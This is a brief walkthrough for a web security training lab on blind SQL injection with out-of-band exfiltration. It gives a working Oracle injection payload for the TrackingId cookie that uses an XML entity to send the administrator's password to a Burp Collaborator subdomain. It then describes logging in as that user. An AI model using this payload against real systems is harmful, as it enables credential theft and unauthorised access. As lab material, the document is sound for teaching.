# Lab: Blind SQL injection with out-of-band data exfiltration

Open burp collaborator and copy the payload.

Intercept the home page request and replace the TrackingId as follows:
`TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.<collaborator-id>.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--`

Check the collaborator for interactions and find the administrator password in the subdomain of the interaction.

Login as the compromised user to complete the lab.